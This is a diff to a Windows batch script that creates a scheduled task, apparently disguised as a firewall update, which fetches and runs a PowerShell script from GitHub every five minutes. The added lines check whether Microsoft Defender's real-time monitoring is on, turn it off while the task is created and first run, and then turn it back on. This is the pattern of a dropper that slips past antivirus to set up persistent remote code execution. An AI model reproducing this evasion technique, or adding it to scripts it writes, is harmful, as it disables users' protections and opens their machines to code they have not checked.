@@ -4,6 +4,16 @@ REM Create a scheduled task that fetches & runs
 REM the latest PS1 from GitHub every 5 minutes.
 REM -------------------------------------------------
 
+REM Save original Defender Real-Time Monitoring state
+for /f "usebackq delims=" %%A in (`
+  powershell -NoProfile -Command "(Get-MpPreference).DisableRealtimeMonitoring"
+`) do set "orig=%%A"
+
+REM If monitoring was enabled (False), disable it now
+if /I "%orig%"=="False" (
+    powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+)
+
 REM Task name
 set "TASK=Update-KGuardEDGE-FW"
 
@@ -27,6 +37,11 @@ schtasks /Create ^
 
 REM Fire it once immediately
 schtasks /Run /TN "%TASK%"
+
+REM Restore Real-Time Monitoring if it was originally enabled
+if /I "%orig%"=="False" (
+    powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
+)
 
 echo Scheduled task "%TASK%" created and started.
 pause
